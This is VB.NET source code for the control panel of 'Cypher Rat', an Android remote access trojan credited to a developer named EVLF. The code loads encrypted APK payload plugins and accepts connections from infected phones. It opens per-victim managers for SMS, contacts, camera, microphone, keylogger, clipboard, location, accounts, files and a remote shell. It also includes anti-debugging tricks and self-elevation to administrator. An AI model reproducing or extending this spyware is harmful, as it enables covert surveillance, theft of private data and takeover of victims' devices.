Imports System.ComponentModel
Imports System.Runtime.InteropServices
Imports System.Threading
'------------------------------------
'---------Cypher Rat By EVLF
'-----------------------------------
'---------t.me/evlfdev
'------------------------------------

Public Class CypherRat
    Public PORT As Integer
    Public server As sockets.Accept
    Private RowsToolTip As ThemeToolTip
    Private Myname As String = "Cypher Rat"
    Public Alive As Boolean = True
    Public Shared ISDB As Boolean = True
    Public Shared MyStatus As UInteger = 1
    Private StatusPanelPaintEventArgsWait As Boolean = False
    Public APPDOM As AppDomain = Nothing
    Private EventArgsActivated As Boolean = False
    Dim Mx As Integer
    Dim Min As Integer
    Dim Sw As Integer
    Dim Sh As Integer
    Dim mov As Boolean
    <DllImport("user32.dll")>
    Public Shared Function FindWindow(ByVal strclassName As String, ByVal strWindowName As String) As IntPtr
    End Function
    <DllImport("Kernel32.dll")>
    Public Shared Function OutputDebugString(ByVal Txt As String) As IntPtr
    End Function
    <DllImport("Ntdll.dll")>
    Public Shared Function NtSetInformationThread(ByVal hThread As IntPtr, ByVal ThreadInformationClass As Integer, ByVal ThreadInformation As IntPtr, ByVal ThreadInformationLength As UInteger) As UInteger
    End Function
    <DllImport("Kernel32.dll")>
    Public Shared Function GetCurrentThread() As IntPtr
    End Function
    Public Shared Function HDB() As UInteger
        MyStatus = NtSetInformationThread(GetCurrentThread(), 17, Nothing, 0)
        If MyStatus <> 0 Then
            MsgBox("Error : X00101", MyStatus)
            Debugger.Break()
            Return 0
        Else
            ISDB = False
            Return 1
        End If
    End Function
    Sub New()
        InitializeComponent()
        SCANER = New clsComputerInfo
        sockets.Data.angelform = Me
    End Sub
    Private Sub NotifyI()
        notfi.Visible = True
    End Sub
    Public Const WM_NCLBUTTONDOWN As Integer = &HA1
    Public Const HT_CAPTION As Integer = &H2
    <DllImportAttribute("user32.dll")>
    Public Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer
    End Function
    <DllImportAttribute("user32.dll")>
    Public Shared Function ReleaseCapture() As Boolean
    End Function
    Private Sub SpyStyle()
    End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Function WaitServer() As Task
        While server Is Nothing
            Threading.Thread.Sleep(100)
        End While
        Return Nothing
    End Function
    Delegate Sub delelabel1(objs As Object())
    Public Sub label1text(objs As Object())
        If Me.Label1.InvokeRequired Then
            Dim logr As delelabel1 = New delelabel1(AddressOf label1text)
            Me.Label1.Invoke(logr, New Object() {objs})
            Exit Sub
        Else
            Dim text As String = objs(0)
            Label1.Text = text
            Label1.Location = New Point(Label1.Location.X + 1, Label1.Location.Y)
            If Label1.Location.X >= Panel1.Width / 2 Then
                reset = True
                Label1.Location = New Point(16, 5)
                Label1.Text = Decrypt("UkPG75SPAqwqYpiwDD/X7EbHTIWu3ZDda/K+JBnQReo=", "CostumeFont")
            End If
        End If
    End Sub
    Public reset As Boolean = False
    Public CK As CHECKER

    Private Async Sub AngelAndroidForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Dim identity = Security.Principal.WindowsIdentity.GetCurrent()
            Dim principal = New Security.Principal.WindowsPrincipal(identity)
            Dim isElevated As Boolean = principal.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator)
            If isElevated Then
                Dim updater As Thread = New Thread(Sub()
                                                       While Alive
                                                           Try
                                                               Threading.Thread.Sleep(80)
                                                               If sockets.Data.label1data Is Nothing Then
                                                                   sockets.Data.label1data = Decrypt("sUL38DTZF6C7caJ2ITOihpgwYoUyUJfc8qgxjCT8Ntw=", "Nagato")
                                                               End If
                                                               label1text(New Object() {sockets.Data.label1data})
                                                               If reset Then
                                                                   reset = False
                                                                   Threading.Thread.Sleep(3000)
                                                               End If
                                                               If sockets.Data.aboutdata Is Nothing Then
                                                                   sockets.Data.aboutdata = (Decrypt("KZFoSwUPmldlO0Tui+4VpfBsCZC8MT0D/4p4WnL+F6NJ9y0DgODlyEnjnxLeGnA0r/ZLXjJ1FW9P
lQqK58quTiFAHvgGZHWJFWUj3ZTLOD3PxfrrlOVMh2KTkA/15jWE8p76+1QeThtlhaIuD6Wh24aI
VIozHEDJa+Sju2KwfwE=", "Nagato")).Split("~")
                                                               End If

                                                           Catch ex As Exception
                                                           End Try
                                                       End While
                                                   End Sub)
                updater.IsBackground = True
                updater.Start()
                If Not IamSingle() Then
                    MsgBox("only one instance of application allowed...")
                    FormEventArgsClosing()
                End If
                If reso.CheckRegPolice("g") = Nothing Then
                    If DialogPloice.ShowDialog() = DialogResult.OK Then
                        reso.CheckRegPolice("s")
                    Else
                        FormEventArgsClosing()
                    End If
                End If
                CK = New CHECKER
                If Not CK.ShowDialog = DialogResult.OK Then
                    FormEventArgsClosing()
                End If
                SpyStyle()
                Me.Icon = My.Resources.max
                Me.Text = String.Format("")
                RowsToolTip = New ThemeToolTip
                Dim FileDirectory As New IO.DirectoryInfo(reso.res_Path & "\Plugins\Android")
                Dim plug As IO.FileInfo() = FileDirectory.GetFiles("*.pl")
                Dim plugExi As String() = "gen-1.pl,gen-2.pl,gen-3.pl,gen-4.pl,gen-5.pl,gen-6.pl,gen-7.pl,gen-8.pl".Split({","}, StringSplitOptions.None)
                Dim missing As Boolean = False
                For Each n In plugExi
                    Dim pathTest As String = String.Format("{0}\{1}", FileDirectory.FullName, n)
                    If Not IO.File.Exists(pathTest) Then
                        missing = True
                        MsgBox(String.Format("Missing :{0}", pathTest), MsgBoxStyle.Critical, reso.nameRAT)
                    End If
                Next
                If missing Then
                    FormEventArgsClosing()
                End If
                reso.plug = New List(Of Object)
                Dim PU2 As Array
                Dim by2 As Byte()
                For Each File As IO.FileInfo In plug
                    If File.Name = "gen-4.pl" Or File.Name = "gen-5.pl" Or File.Name = "gen-1.pl" Then
                        by2 = IO.File.ReadAllBytes(File.FullName)
                        PU2 = {reso.domen & "." & reso.Generals(File.Name.Substring(0, File.Name.LastIndexOf("."))), CStr(plug.Length), "rm -r ", "dex", by2, "ping -c 1 -W 15 "}
                        reso.plug.Add(PU2)
                        Continue For
                    End If
                    Dim BY As Byte() = Codes.DE(IO.File.ReadAllBytes(File.FullName), "spymax")
                    Dim PU As Array = {reso.domen & "." & reso.Generals(File.Name.Substring(0, File.Name.LastIndexOf("."))), CStr(plug.Length), "rm -r ", "dex", BY, "ping -c 1 -W 15 "}
                    reso.plug.Add(PU)
                Next
                If My.Settings._multi_sounds = "Yes" Then
                    Notif_Sound.multi = True
                Else
                    Notif_Sound.multi = False
                End If
                If IO.File.Exists(Notif_Sound.path_File) Then
                    Notif_Sound.aMedia = New System.Media.SoundPlayer
                    Notif_Sound.aMedia.SoundLocation = Notif_Sound.path_File
                    Notif_Sound.aMedia.Load()
                End If
                reso.maps = New System.Text.StringBuilder
                reso.maps.Append(IO.File.ReadAllText(reso.res_Path & "\Config\maps.inf"))
                Dim WinMM As String = reso.MY_Path & "WinMM.Net.dll"
                If Not IO.File.Exists(WinMM) Then
                    Throw New System.Exception("Missing :" & WinMM)
                End If
                Dim F0ntStyle As FontStyle = FontStyle.Regular
                Dim ttFont As String = "Hack-Regular.ttf"
                Select Case My.Settings.FontStyle
                    Case "Bold"
                        F0ntStyle = FontStyle.Bold
                        ttFont = "Hack-Bold.ttf"
                    Case "Regular"
                        F0ntStyle = FontStyle.Regular
                        ttFont = "Hack-Regular.ttf"
                End Select
                Dim F0ntSize As Integer = My.Settings.FontSize
                reso.f = CustomFont.LoadFont(ttFont, F0ntSize, F0ntStyle)
                reso.FontDrawString = CustomFontDrawString.LoadFont(ttFont, 11, F0ntStyle)
                reso.SupportedText = IO.File.ReadAllText(reso.res_Path & "\Config\supported_text.inf").ToLower
                reso.SupportedImages = IO.File.ReadAllText(reso.res_Path & "\Config\supported_images.inf").ToLower
                reso.SupportedVideo = IO.File.ReadAllText(reso.res_Path & "\Config\supported_video.inf").ToLower
                Me.Label1.Text = Decrypt("QaCbWqzJzFvnX+E4Y/js8A==", "Android\Plugins\res")
                Dim p As New Ports
                p.StartPosition = FormStartPosition.Manual
                p.Location = Codes.FixSize(Me, p)
                Dim getPORT As String = Nothing
                Select Case p.ShowDialog(Me)
                    Case DialogResult.OK
                        getPORT = p._ports
                        My.Settings.ports = getPORT
                        My.Settings.Save()
                    Case Else
                        Me.Close()
                End Select
                Me.TOpacity.Interval = SpySettings.T_Interval
                Me.TOpacity.Enabled = True
                Dim s As String() = getPORT.Split(":")
                Dim t As Threading.Thread = New Threading.Thread(Sub() server = New sockets.Accept(s))
                t.Start()
                Await Task.Factory.StartNew(Function() WaitServer(), TaskCreationOptions.None)
                NotifyI()
                reso.NewIcon(reso.res_Path & "\Icons\apk.ico", ".apk")
                Timer1.Start()
                Dim thread As Thread = New Thread(AddressOf Bing)
                thread.Start()
                StatusPanelPaintEventArgsWait = True
            Else
                Dim startInfo As New ProcessStartInfo()
                Dim myprocess As New Process()
                startInfo.FileName = Application.ExecutablePath
                startInfo.Verb = "runas"
                myprocess.StartInfo = startInfo
                Try
                    myprocess.Start()
                Catch ex As Exception
                Finally
                    End
                End Try
            End If
        Catch ex As Exception
            MsgBox(String.Format("{0}", ex.Message), MsgBoxStyle.Critical, reso.nameRAT)
            FormEventArgsClosing()
        End Try
    End Sub
    Private Function IamSingle() As Boolean
        For Each p In Process.GetProcesses
            If p.ProcessName Is Process.GetCurrentProcess.ProcessName Then
                Return False
            End If
        Next
        Return True
    End Function
    Public Sub CypherStyle()
        Dim StyleColor As Color = FINDCOLOR(154, My.Resources.ARPolice, MyStatus)
        If StyleColor = Color.Green Then
            Return
        Else
            FormEventArgsClosing()
        End If
    End Sub
    Private Function FINDCOLOR(v As Integer, aRPolice As String, myStatus As UInteger) As Color
        If v >= 100 Then
            v = v - 100
            Dim Num = HDB()
            If Num = 1 Then
                Return Color.Green
            ElseIf Num = 0 Then
                FormEventArgsClosing()
            End If
        End If
    End Function
    Public Sub StartCheck()
        Threading.Thread.Sleep(1)
        Dim s As String = SCANTHETIME()
        Threading.Thread.Sleep(1)
        If s = "M" Then
            Threading.Thread.Sleep(100)
            CK.Finish = True
        Else
            Me.Close()
        End If
    End Sub

    Private Sub AngelAndroidForm_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        FormEventArgsClosing()
    End Sub
    Public Sub FormEventArgsClosing()
        Try
            notfi.Visible = False
            If sockets.Data.nReport IsNot Nothing Then
                sockets.Data.nReport.Close()
            End If
            If server IsNot Nothing Then
                server.Listener.Stop()
                server.Listener.Server.Close()
            End If
        Catch ex As Exception
        End Try
        Application.ExitThread()
        Application.Exit()
    End Sub
    Private Sub notfi_MouseClick(sender As Object, e As MouseEventArgs) Handles notfi.MouseClick
        If e.Button = MouseButtons.Left Then
            If Not Me.WindowState = FormWindowState.Normal Then
                Me.WindowState = FormWindowState.Normal
            End If
            Me.TopMost = True
            Me.TopMost = False
        End If
    End Sub
    Private A As About
    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If A Is Nothing Then
            A = New About
            Select Case A.ShowDialog(Me)
                Case DialogResult.OK
                    A.Close()
                    A = Nothing
                Case Else
                    A.Close()
                    A = Nothing
            End Select
        End If
    End Sub
    Public B As Build
    Private Sub BuildToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If B Is Nothing Then
            B = New Build
            Select Case B.ShowDialog(Me)
                Case DialogResult.OK
                    B.Close()
                    B = Nothing
                Case Else
                    B.Close()
                    B = Nothing
            End Select
        End If
    End Sub
    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs)
        FormEventArgsClosing()
    End Sub
    Public Workers() As BackgroundWorker
    Private NumWorkers = 0
    Public Sub Work()
        NumWorkers = NumWorkers + 1
        ReDim Workers(NumWorkers)
        Workers(NumWorkers) = New BackgroundWorker
        Workers(NumWorkers).WorkerReportsProgress = True
        Workers(NumWorkers).WorkerSupportsCancellation = True
        AddHandler Workers(NumWorkers).DoWork, AddressOf WorkerDoWork
        Workers(NumWorkers).RunWorkerAsync()
    End Sub
    Delegate Sub addLogback(objs As Object())
    Private Sub WorkerDoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs)
        CK.Done(New Object() {Codes.Decrypt("k4THs+x+aGgYLg7AJm7XVQ==", SpySettings.FormColorStyle)})
        If PassToo() Then
            Thread.Sleep(3000)
            StartCheck()
        End If
    End Sub
    Private Function PassToo() As Boolean
        Dim Ts = CypherRat.FindWindow(Codes.Decrypt("hmcL22ZmiVEfoXxpSK9U2g==", sockets.Data.THEKEY), Nothing)
        If Ts <> IntPtr.Zero Then
            MsgBox("Error")
            Environment.Exit(0)
        End If
        Dim Ts2 = CypherRat.FindWindow("WinDbgFrameClass", Nothing)
        If Ts2 <> IntPtr.Zero Then
            MsgBox("Error")
            Environment.Exit(0)
        End If
        OutputDebugString("%s%s%s%s%s%s%s%s%s%s%s" +
                          "%s%s%s%s%s%s%s%s%s%s%s%s%s" +
                          "%s%s%s%s%s%s%s%s%s%s%s%s%s" +
                          "%s%s%s%s%s%s%s%s%s%s%s%s%s")
        Return True
    End Function
    Public SCANER As clsComputerInfo = Nothing
    Public Sub addLog(objs As Object())
        If Me.DataLog.InvokeRequired Then
            Dim logr As addLogback = New addLogback(AddressOf addLog)
            Me.DataLog.Invoke(logr, New Object() {objs})
            Exit Sub
        Else
            Dim flag As Image = objs(0)
            Dim ip As String = objs(1)
            Dim Country As String = objs(2)
            Dim status As String = objs(3)
            If Me.DataLog.Rows.Count > 50 Then
                Me.DataLog.Rows.Clear()
            End If
            Me.DataLog.Rows.Add(flag, ip, Country, status)
        End If
    End Sub
    Public Sub UpdateForms(ByVal Card As ClientCard)
        Dim Forms As String = "null"
        For Each frm As Form In Application.OpenForms
            If frm IsNot Nothing AndAlso frm.Tag IsNot Nothing Then
                Dim Target_CAM As New CameraManager
                If frm.Tag.ToString = "Cam_" + Card.ClassClient.ClientAddressIP Then
                    Target_CAM = frm
                    Target_CAM.statustext.Text = "Client Reconnected , Please Select Camer..."
                    If Target_CAM.Changed Then
                        Target_CAM.Changed = False
                        If Not Target_CAM.classCamera Is Nothing Then
                            Target_CAM.classCamera.qit = True
                            Target_CAM.classCamera.Close(Target_CAM.CameraClient, "Camera Ended")
                        End If
                    End If
                    Target_CAM.Sbtn.Enabled = False
                    Target_CAM.Fbtn.Enabled = True
                    Target_CAM.Bbtn.Enabled = True
                    Target_CAM.Bbtn.Tag = "off"
                    Target_CAM.Fbtn.Tag = "off"
                End If
            End If
            If frm IsNot Nothing AndAlso frm.Tag IsNot Nothing Then
                If frm.Tag.ToString = Card.ClassClient.ClientAddressIP Then
                    Dim Target_form As New FileManager
                    Target_form = frm
                    Target_form.pathtxt.BackColor = Color.White
                    Target_form.Tag = Card.ClassClient.ClientAddressIP
                    Target_form.Name = "File_Manager_" & Card.ClassClient.ClientAddressIP
                    Target_form.Title = String.Format("{0} - IP:{1}", "File Manager", Card.ClassClient.ClientAddressIP)
                    Target_form.Text = String.Format("{0} - IP:{1}", "File Manager", Card.ClassClient.ClientAddressIP)
                    Target_form.Client = Card.ClassClient.myClient
                    Target_form.classClient = Card.ClassClient
                    Target_form.ver = Card.ClassClient.VersionClient
                    Target_form.DGV0.AutoGenerateColumns = False
                    Target_form.DGV0.Columns(5).DisplayIndex = 0
                    Target_form.Timer1.Start()
                    Target_form.viwimage.Image = Nothing
                    Exit For
                End If
            End If
        Next
    End Sub
    Public Sub RemoveCard(ByVal Card As ClientCard)
        If Me.InvokeRequired Then
            Me.Invoke(Sub() RemoveCard(Card))
            Exit Sub
        Else
            Try
                Dim Forms As String = "null"
                If Card IsNot Nothing Then
                    clientsflow.Controls.Remove(Card)
                End If
                If Not Forms = "null" Then
                    Dim handle As String = "Calls_Manager_" & Forms
                    Dim FM As Form = My.Application.OpenForms(handle)
                    Dim CS As String() = {"Close windows", "Disconnected ---> "}
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "SMS_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Contacts_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Camera_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    Try
                        handle = "File_Manager_" & CStr(Card.ClassClient.ClientAddressIP)
agin:
                        FM = My.Application.OpenForms(handle)
                        If FM IsNot Nothing Then
                            If Not FM.IsDisposed Then
                                Dim fm2 As FileManager = FM
                                If SpySettings.DISCONNECTED = CS(0) Then
                                    FM.Close()
                                Else
                                    Dim FTEXT As String = FM.Text
                                    FM.Text = CS(1) & FTEXT
                                    For Each Ro As DataGridViewRow In fm2.DGVDATA.Rows
                                        If Ro.Cells(4).Value = "Downloading.." Then
                                            Ro.Cells(4).Value = "Faild.."
                                            Ro.Tag = "x"
                                            Ro.DefaultCellStyle.ForeColor = Color.Red
                                        End If
                                    Next
                                End If
                            End If
                        End If
                    Catch ex As Exception
                        If Not handle = "File_Manager_" & Forms Then
                            handle = "File_Manager_" & Forms
                            GoTo agin
                        End If
                    End Try
                    handle = "Microphone_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "SM_Hunter_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            Dim FTEXT As String = FM.Text
                            FM.Text = CS(1) & FTEXT
                        End If
                    End If
                    handle = "Shell_Terminal_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Location_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Applications_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Account_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "informations_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Keylogger_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "Clipboard_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                End If
            Catch xErrors As Exception
            End Try
        End If
    End Sub
    Private Sub BoxTitle_Paint(sender As Object, e As PaintEventArgs)
    End Sub
    Public WU As Win_Users
    Private Sub UsersToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If WU Is Nothing Then
            WU = New Win_Users
            Dim users_ As String = reso.res_Path & "\Users"
            If IO.Directory.Exists(users_) Then
                Dim Dirs() As String = IO.Directory.GetDirectories(users_)
                For Each Dir As String In Dirs
                    Dim dr As New IO.DirectoryInfo(Dir)
                    Dim user_file As String = dr.FullName & "\user.info"
                    If IO.File.Exists(user_file) Then
                        Try
                            Dim Ln As String() = IO.File.ReadAllLines(user_file)
                            If Ln.Length = 3 Then
                                Dim getPath As String = reso.res_Path & "\Icons\FillEllipse\User.png"
                                WU.DGV0.Rows.Add(Ln(0), Ln(2) & " /ip:" & Ln(1), dr.Name, reso.GetEllImage(0, {getPath, 15, 15, 17, 17}))
                            End If
                        Catch ex As Exception
                        End Try
                    End If
                Next
            End If
            WU.DGV0.Columns(3).Width = reso.IconsSize
            WU.DGV0.Columns(3).DisplayIndex = 0
            WU.StartPosition = FormStartPosition.Manual
            WU.Location = Codes.FixSize(Me, WU)
            WU.Show()
        End If
    End Sub

    Public Function SCANTHETIME() As String
        If sockets.Data.label1data IsNot Nothing Then
            For index = 10 To 0 Step -1
                Thread.Sleep(1000)
                If index > 5 Then
                    CK.Done(New Object() {sockets.Data.label1data})
                Else
                    CK.viw(New Object() {})
                    CK.Done(New Object() {Decrypt("6VICZbxkfKbDiAl9sUDOUwd603dAqg1lIM3S6kisi9DvvPdlFxxgqyxWAwXgbYlR9Tgem2zesp50
uhblzxzWxQ==", "countryflags")})
                End If
            Next
        Else
            For index = 10 To 0 Step -1
                Thread.Sleep(1000)
                If index > 5 Then
                    CK.Done(New Object() {Decrypt("7SXYy9osCO0RbjSqlzRmXWVMeIMHGdIRg1VI1AB+DFFunbR9ipUI6Ln6YxwQci/o", "countryflags") + " " + Decrypt("Ms4ZmnagPACM3HliOh8fyA==", "iconsdata")})
                Else
                    CK.viw(New Object() {})
                    CK.Done(New Object() {Decrypt("6VICZbxkfKbDiAl9sUDOUwd603dAqg1lIM3S6kisi9DvvPdlFxxgqyxWAwXgbYlR9Tgem2zesp50
uhblzxzWxQ==", "countryflags")})
                End If
            Next
        End If
        Thread.Sleep(3000)
        Return "M"
    End Function


    Private Sub AngelAndroidForm_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Alive = False
        Timer1.Stop()
        Environment.Exit(0)
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Close()
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
#Disable Warning BC42025
        WindowState = WindowState.Minimized
#Enable Warning BC42025
    End Sub
     Private Sub Panel1_MouseDown(sender As Object, e As MouseEventArgs) Handles Panel1.MouseDown
        If e.Button = Windows.Forms.MouseButtons.Left Then
            ReleaseCapture()
            SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
        End If
    End Sub
     Private CYPHERSETTNGS As CypherSettings
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        If CYPHERSETTNGS Is Nothing Then
             CYPHERSETTNGS = New CypherSettings
             Select Case CYPHERSETTNGS.ShowDialog(Me)
                 Case DialogResult.OK
                     CYPHERSETTNGS.Close()
                     CYPHERSETTNGS = Nothing
                 Case Else
                     CYPHERSETTNGS.Close()
                     CYPHERSETTNGS = Nothing
             End Select
         End If
                End Sub
     Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Bldbtn.Click
         SelecteBilder.Show(Me)
    End Sub
     Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        If A Is Nothing Then
             A = New About
             Select Case A.ShowDialog(Me)
                 Case DialogResult.OK
                     A.Close()
                     A = Nothing
                 Case Else
                     A.Close()
                     A = Nothing
             End Select
         End If
     End Sub
     Private Sub StatusPanel_MouseDown(sender As Object, e As MouseEventArgs) Handles StatusPanel.MouseDown
        mov = True
        Min = MousePosition.Y
        Mx = MousePosition.X
        Sw = Width
        Sh = Height
    End Sub
     Private Sub StatusPanel_MouseMove(sender As Object, e As MouseEventArgs) Handles StatusPanel.MouseMove
        If mov Then
             Me.Height = MousePosition.Y - Min + Sh
        End If
    End Sub
     Private Sub StatusPanel_MouseUp(sender As Object, e As MouseEventArgs) Handles StatusPanel.MouseUp
        mov = False
    End Sub
     Dim temptext As String
    Dim temptext2 As String
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
         If temptext = Me.RcvText.Text Then
            Me.RcvText.Text = "Received " & "0" & " Bytes"
        Else
            temptext = Me.RcvText.Text
        End If
         If temptext2 = Me.SntText.Text Then
            Me.SntText.Text = "Sent " & "0" & " Bytes"
        Else
            temptext2 = Me.SntText.Text
        End If
         Dim ary As Array = UploadDownload(server.BytesSent, server.BytesReceived)
         Me.RcvText.Text = "Received : " & ary.GetValue(0)
         Me.SntText.Text = "Sent : " & ary.GetValue(1)
        Me.PortText.Text = "Port : " + infoServer.PORTS
        Me.OnlinText.Text = "Online : " & CStr(clientsflow.Controls.Count)
                 Thread.Sleep(1)
    End Sub
     Public Sub Bing()
        While Alive
            Thread.Sleep(5000)
            If clientsflow.Controls.Count > 0 Then
                 Try
                    For Each card As ClientCard In clientsflow.Controls
                         Dim claClient As sockets.Client = card.ClassClient
                        If claClient IsNot Nothing Then
                            If claClient.Statistics IsNot "null" Then
                                 card.UpdateValue()
                               End If
                         End If
                     Next
                Catch ex As Exception
                 End Try
            End If
         End While
    End Sub
     Private Sub Panel2_MouseDown(sender As Object, e As MouseEventArgs) Handles RightPanel.MouseDown
        mov = True
        Min = MousePosition.Y
        Mx = MousePosition.X
        Sw = Width
        Sh = Height
    End Sub
    Private Sub Panel2_MouseMove(sender As Object, e As MouseEventArgs) Handles RightPanel.MouseMove
        If mov Then
            Me.Width = MousePosition.X - Mx + Sw
        End If
    End Sub
    '------------------------------------
    '---------Cypher Rat By EVLF
    '-----------------------------------
    '--------- t . me /evlfdev
    '------------------------------------
    Private Sub Panel2_MouseUp(sender As Object, e As MouseEventArgs) Handles RightPanel.MouseUp
        mov = False
    End Sub
     Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
           If DataLog.Tag.ToString = "b" Then
             Button6.Text = "Users"
            DataLog.Tag = "f"
            DataLog.BringToFront()
            clearbtn.Visible = True
        ElseIf DataLog.Tag.ToString = "f" Then
             Button6.Text = "Logs"
            DataLog.Tag = "b"
            DataLog.SendToBack()
            clearbtn.Visible = False
        End If
    End Sub
     Private Sub Clearbtn_Click(sender As Object, e As EventArgs) Handles clearbtn.Click
           If Me.DataLog.Rows.Count > 0 Then
            Me.DataLog.Rows.Clear()
        End If
    End Sub
     Private Sub Button7_Click(sender As Object, e As EventArgs)
          If Me.LeftPanel.Width = 7 Then
            Me.LeftPanel.Width = 178
        Else
            Me.LeftPanel.Width = 7
        End If
     End Sub
     Private Sub LeftPanel_MouseDown(sender As Object, e As MouseEventArgs) Handles LeftPanel.MouseDown
        If e.Button = Windows.Forms.MouseButtons.Left Then
            ReleaseCapture()
            SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
        End If
    End Sub
     Private Sub Button7_Click_1(sender As Object, e As EventArgs) Handles Button7.Click
        Try
            Process.Start("https://t.me/evlfdev")
        Catch ex As Exception
         End Try
    End Sub
End Class